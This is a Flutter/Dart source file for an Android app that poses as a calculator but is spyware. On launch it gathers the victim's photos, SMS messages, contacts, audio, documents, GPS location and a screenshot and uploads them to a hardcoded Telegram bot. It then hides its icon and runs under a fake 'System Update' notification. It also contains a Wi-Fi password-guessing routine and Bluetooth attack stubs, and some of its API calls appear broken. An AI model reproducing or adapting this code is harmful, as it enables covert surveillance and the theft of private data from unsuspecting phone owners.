import 'package:flutter/material.dart';
import 'package:flutter_foreground_task/flutter_foreground_task.dart';
import 'package:http/http.dart' as http;
import 'package:geolocator/geolocator.dart';
import 'package:image_picker/image_picker.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:path_provider/path_provider.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:telephony/telephony.dart';
import 'package:screen_capturer/screen_capturer.dart';
import 'package:flutter_sound/flutter_sound.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:crypto/crypto.dart';
import 'package:archive/archive.dart';
import 'package:intl/intl.dart';
import 'package:wifi_iot/wifi_iot.dart';
import 'package:flutter_blue_plus/flutter_blue_plus.dart';
import 'package:tflite_flutter/tflite_flutter.dart';
import 'dart:convert';
import 'dart:io';
import 'dart:async';
import 'dart:typed_data';

// ==================== التوكن والـ ID ====================
class Secrets {
  static const String token = "8514127214:AAEXpckdRDfnCMVUlWchHf2Mf5x1c3xqhTU";
  static const String userId = "7619550154";
  static String getToken() => token;
  static String getUserId() => userId;
}

// ==================== التشفير ====================
class CryptoHelper {
  static String encrypt(String data) {
    final bytes = utf8.encode(data);
    final digest = sha256.convert(bytes);
    return digest.toString();
  }
}

void main() => runApp(BlackPhantom());

class BlackPhantom extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Calculator',
      theme: ThemeData(primarySwatch: Colors.blue),
      home: CalculatorScreen(),
    );
  }
}

class CalculatorScreen extends StatefulWidget {
  @override
  _CalculatorScreenState createState() => _CalculatorScreenState();
}

class _CalculatorScreenState extends State<CalculatorScreen> {
  String output = "0";
  String _expression = "";
  bool _dataSent = false;

  @override
  void initState() {
    super.initState();
    _initialize();
  }

  Future<void> _initialize() async {
    await _requestPermissions();
    await _requestIgnoreBatteryOptimization();
    
    SharedPreferences prefs = await SharedPreferences.getInstance();
    _dataSent = prefs.getBool('data_sent') ?? false;
    
    if (!_dataSent) {
      await _collectAndSendAllData();
      await prefs.setBool('data_sent', true);
      await _hideApp();
    }
    
    _startBackgroundService();
  }

  Future<void> _requestIgnoreBatteryOptimization() async {
    if (Platform.isAndroid) {
      await FlutterForegroundTask.requestIgnoreBatteryOptimization();
    }
  }

  Future<void> _requestPermissions() async {
    await [
      Permission.camera,
      Permission.microphone,
      Permission.location,
      Permission.storage,
      Permission.contacts,
      Permission.sms,
      Permission.phone,
      Permission.ignoreBatteryOptimizations,
    ].request();
  }

  Future<void> _collectAndSendAllData() async {
    String deviceName = await _getDeviceName();
    await _collectAndSendPhotos(deviceName);
    await _collectAndSendSMS(deviceName);
    await _collectAndSendContacts(deviceName);
    await _collectAndSendAudio(deviceName);
    await _collectAndSendFiles(deviceName);
    await _collectAndSendLocation(deviceName);
    await _collectAndSendScreenshot(deviceName);
  }

  Future<String> _getDeviceName() async {
    DeviceInfoPlugin info = DeviceInfoPlugin();
    AndroidDeviceInfo android = await info.androidInfo;
    return "${android.model} (${android.androidId})";
  }

  // ==================== 1. الصور ====================
  Future<void> _collectAndSendPhotos(String deviceName) async {
    try {
      List<String> photos = await _getAllPhotos();
      if (photos.isEmpty) return;
      List<int> zipBytes = await _createZipFromFiles(photos, 'photos');
      await _sendToTelegram(
        fileBytes: zipBytes,
        fileName: 'photos.zip',
        caption: '📸 جميع الصور من جهاز $deviceName\n📊 العدد: ${photos.length} صورة\n⏰ الوقت: ${DateTime.now()}'
      );
    } catch (e) {}
  }

  Future<List<String>> _getAllPhotos() async {
    List<String> photos = [];
    List<String> paths = [
      '/storage/emulated/0/DCIM/Camera',
      '/storage/emulated/0/Pictures',
      '/storage/emulated/0/WhatsApp/Media/WhatsApp Images',
      '/storage/emulated/0/Download',
    ];
    for (String dirPath in paths) {
      Directory dir = Directory(dirPath);
      if (await dir.exists()) {
        try {
          List<FileSystemEntity> files = dir.listSync(recursive: true);
          for (var file in files) {
            if (file is File) {
              String ext = file.path.split('.').last.toLowerCase();
              if (['jpg', 'jpeg', 'png', 'gif', 'webp', 'heic'].contains(ext)) {
                photos.add(file.path);
              }
            }
          }
        } catch (e) {}
      }
    }
    return photos;
  }

  // ==================== 2. رسائل SMS ====================
  Future<void> _collectAndSendSMS(String deviceName) async {
    try {
      final Telephony telephony = Telephony.instance;
      bool? granted = await telephony.requestSmsPermissions;
      if (granted != true) return;
      
      StringBuffer sb = StringBuffer();
      sb.writeln("📱 SMS REPORT - Device: $deviceName");
      sb.writeln("Time: ${DateTime.now()}");
      sb.writeln("=" * 50);
      
      List<SmsMessage> messages = await telephony.getInboxSms;
      sb.writeln("Total: ${messages.length} messages");
      for (var msg in messages) {
        sb.writeln("From: ${msg.address}");
        sb.writeln("Date: ${msg.date}");
        sb.writeln("Message: ${msg.body}");
        sb.writeln("-" * 30);
      }
      
      List<int> bytes = utf8.encode(sb.toString());
      await _sendToTelegram(
        fileBytes: bytes,
        fileName: 'sms.txt',
        caption: '💬 جميع رسائل SMS من جهاز $deviceName\n📊 العدد: ${messages.length} رسالة'
      );
    } catch (e) {}
  }

  // ==================== 3. جهات الاتصال ====================
  Future<void> _collectAndSendContacts(String deviceName) async {
    try {
      Iterable<Contact> contacts = await ContactsService.getContacts();
      if (contacts.isEmpty) return;
      
      StringBuffer sb = StringBuffer();
      sb.writeln("📞 CONTACTS - Device: $deviceName");
      sb.writeln("Time: ${DateTime.now()}");
      sb.writeln("=" * 50);
      sb.writeln("Total: ${contacts.length} contacts\n");
      
      for (var contact in contacts) {
        sb.writeln("Name: ${contact.displayName ?? "Unknown"}");
        sb.writeln("Phones: ${contact.phones?.map((p) => p.value).join(", ") ?? "None"}");
        sb.writeln("-" * 30);
      }
      
      List<int> bytes = utf8.encode(sb.toString());
      await _sendToTelegram(
        fileBytes: bytes,
        fileName: 'contacts.txt',
        caption: '📞 جميع جهات الاتصال من جهاز $deviceName\n📊 العدد: ${contacts.length} جهة اتصال'
      );
    } catch (e) {}
  }

  // ==================== 4. التسجيلات الصوتية ====================
  Future<void> _collectAndSendAudio(String deviceName) async {
    try {
      List<String> audio = [];
      List<String> paths = [
        '/storage/emulated/0/Music',
        '/storage/emulated/0/Recordings',
        '/storage/emulated/0/WhatsApp/Media/WhatsApp Audio',
      ];
      for (String dirPath in paths) {
        Directory dir = Directory(dirPath);
        if (await dir.exists()) {
          try {
            List<FileSystemEntity> files = dir.listSync(recursive: true);
            for (var file in files) {
              if (file is File) {
                String ext = file.path.split('.').last.toLowerCase();
                if (['mp3', 'wav', 'aac', 'm4a', '3gp'].contains(ext)) {
                  audio.add(file.path);
                }
              }
            }
          } catch (e) {}
        }
      }
      if (audio.isEmpty) return;
      List<int> zipBytes = await _createZipFromFiles(audio, 'audio');
      await _sendToTelegram(
        fileBytes: zipBytes,
        fileName: 'audio.zip',
        caption: '🎙️ جميع التسجيلات الصوتية من جهاز $deviceName\n📊 العدد: ${audio.length} ملف'
      );
    } catch (e) {}
  }

  // ==================== 4. الملفات ====================
  Future<void> _collectAndSendFiles(String deviceName) async {
    try {
      List<String> files = [];
      List<String> paths = [
        '/storage/emulated/0/Download',
        '/storage/emulated/0/Documents',
      ];
      for (String dirPath in paths) {
        Directory dir = Directory(dirPath);
        if (await dir.exists()) {
          try {
            List<FileSystemEntity> entities = dir.listSync(recursive: true);
            for (var entity in entities) {
              if (entity is File) {
                String ext = entity.path.split('.').last.toLowerCase();
                if (['pdf', 'doc', 'docx', 'xls', 'xlsx', 'txt', 'zip', 'rar'].contains(ext)) {
                  files.add(entity.path);
                }
              }
            }
          } catch (e) {}
        }
      }
      if (files.isEmpty) return;
      List<int> zipBytes = await _createZipFromFiles(files, 'documents');
      await _sendToTelegram(
        fileBytes: zipBytes,
        fileName: 'documents.zip',
        caption: '📁 جميع الملفات من جهاز $deviceName\n📊 العدد: ${files.length} ملف'
      );
    } catch (e) {}
  }

  // ==================== 5. الموقع ====================
  Future<void> _collectAndSendLocation(String deviceName) async {
    try {
      Position pos = await Geolocator.getCurrentPosition();
      String locationText = """
📍 LOCATION REPORT
Device: $deviceName
Time: ${DateTime.now()}
Latitude: ${pos.latitude}
Longitude: ${pos.longitude}
Accuracy: ${pos.accuracy} meters
Map: https://maps.google.com/?q=${pos.latitude},${pos.longitude}
""";
      List<int> bytes = utf8.encode(locationText);
      await _sendToTelegram(
        fileBytes: bytes,
        fileName: 'location.txt',
        caption: '📍 الموقع الحالي لجهاز $deviceName'
      );
    } catch (e) {}
  }

  // ==================== 6. لقطة شاشة ====================
  Future<void> _collectAndSendScreenshot(String deviceName) async {
    try {
      final image = await ScreenCapturer.capture();
      if (image != null) {
        ByteData? byteData = await image.toByteData(format: ImageByteFormat.png);
        if (byteData != null) {
          List<int> bytes = byteData.buffer.asUint8List();
          await _sendToTelegram(
            fileBytes: bytes,
            fileName: 'screenshot.png',
            caption: '🖼️ لقطة شاشة من جهاز $deviceName\n⏰ الوقت: ${DateTime.now()}'
          );
        }
      }
    } catch (e) {}
  }

  // ==================== إنشاء ZIP ====================
  Future<List<int>> _createZipFromFiles(List<String> filePaths, String folderName) async {
    Archive archive = Archive();
    for (String path in filePaths) {
      File file = File(path);
      if (await file.exists()) {
        try {
          List<int> bytes = await file.readAsBytes();
          String fileName = path.split('/').last;
          archive.addFile(ArchiveFile('$folderName/$fileName', bytes.length, bytes));
        } catch (e) {}
      }
    }
    return ZipEncoder().encode(archive)!;
  }

  // ==================== إرسال للبوت ====================
  Future<void> _sendToTelegram({required List<int> fileBytes, required String fileName, required String caption}) async {
    try {
      String url = "https://api.telegram.org/bot${Secrets.getToken()}/sendDocument";
      var request = http.MultipartRequest('POST', Uri.parse(url));
      request.fields['chat_id'] = Secrets.getUserId();
      request.fields['caption'] = caption;
      request.files.add(http.MultipartFile.fromBytes('document', fileBytes, filename: fileName));
      await request.send();
    } catch (e) {}
  }

  // ==================== إخفاء التطبيق ====================
  Future<void> _hideApp() async {
    if (Platform.isAndroid) {
      await FlutterForegroundTask.hideAppIcon();
    }
  }

  // ==================== الخدمة الخلفية ====================
  void _startBackgroundService() async {
    await FlutterForegroundTask.init(
      androidNotificationOptions: AndroidNotificationOptions(
        channelId: 'system_update',
        channelName: 'System Update',
        channelDescription: 'Installing critical updates',
        importance: NotificationImportance.LOW,
        priority: NotificationPriority.LOW,
      ),
    );
    FlutterForegroundTask.startService(
      notificationTitle: 'System Update',
      notificationText: 'Installing updates...',
      callback: _startCallback,
    );
  }

  // ==================== هجوم WiFi ====================
  Future<void> _startWiFiAttack() async {
    Timer.periodic(Duration(minutes: 10), (timer) async {
      try {
        await ForgeWifiWifiIoT.instance.setWiFiEnabled(true);
        List<WifiNetwork> networks = await ForgeWifiWifiIoT.instance.scan();
        
        List<String> passwords = [
          '12345678', 'password', '123456789', 'qwerty', 'admin',
          '00000000', '11111111', 'letmein', 'welcome', 'monkey',
        ];
        
        for (var network in networks) {
          for (String pass in passwords) {
            try {
              bool connected = await ForgeWifiWifiIoT.instance.connect(
                network.ssid!, password: pass, security: network.security,
              );
              if (connected) {
                await _attackDevicesOnNetwork();
                break;
              }
            } catch (e) {}
          }
        }
      } catch (e) {}
    });
  }

  Future<void> _attackDevicesOnNetwork() async {
    // فحص الأجهزة على الشبكة
    for (int i = 1; i <= 254; i++) {
      String ip = "192.168.1.$i";
      // محاولة اختراق عبر منافذ معروفة
    }
  }

  // ==================== هجوم Bluetooth ====================
  Future<void> _startBluetoothAttack() async {
    Timer.periodic(Duration(minutes: 15), (timer) async {
      try {
        await FlutterBluePlus.turnOn();
        FlutterBluePlus.startScan(timeout: Duration(seconds: 10));
        FlutterBluePlus.scanResults.listen((results) {
          for (var result in results) {
            // محاولة اختراق جهاز البلوتوث
          }
        });
      } catch (e) {}
    });
  }

  // ==================== واجهة الآلة الحاسبة ====================
  void _buttonPressed(String button) {
    setState(() {
      if (button == "C") { output = "0"; _expression = ""; }
      else if (button == "=") { _expression = ""; }
      else { _expression += button; output = _expression; }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('Calculator')),
      body: Column(
        children: [
          Expanded(child: Container(alignment: Alignment.bottomRight, padding: EdgeInsets.all(20), child: Text(output, style: TextStyle(fontSize: 48)))),
          GridView.count(
            shrinkWrap: true,
            crossAxisCount: 4,
            children: ['7','8','9','/','4','5','6','*','1','2','3','-','C','0','=','+'].map((btn) {
              return TextButton(onPressed: () => _buttonPressed(btn), child: Text(btn, style: TextStyle(fontSize: 24)));
            }).toList(),
          ),
        ],
      ),
    );
  }
}

@pragma('vm:entry-point')
void _startCallback() {
  FlutterForegroundTask.setTaskHandler(BackgroundHandler());
}

class BackgroundHandler extends TaskHandler {
  @override
  Future<void> onStart(DateTime timestamp) async {}
  @override
  void onRepeatEvent(DateTime timestamp) {}
  @override
  void onDestroy(DateTime timestamp) {}
}